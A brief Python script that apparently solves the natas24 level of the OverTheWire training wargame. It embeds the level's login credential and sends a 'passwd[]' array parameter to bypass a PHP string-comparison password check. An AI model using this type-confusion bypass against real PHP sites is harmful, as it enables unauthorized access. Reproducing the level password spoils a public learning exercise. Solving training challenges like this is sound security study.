#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas24'
password = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.get(url, auth = (username, password))
response = session.post(url, data = {'passwd[]': 'plzsub'}, auth = (username, password))
print response.text
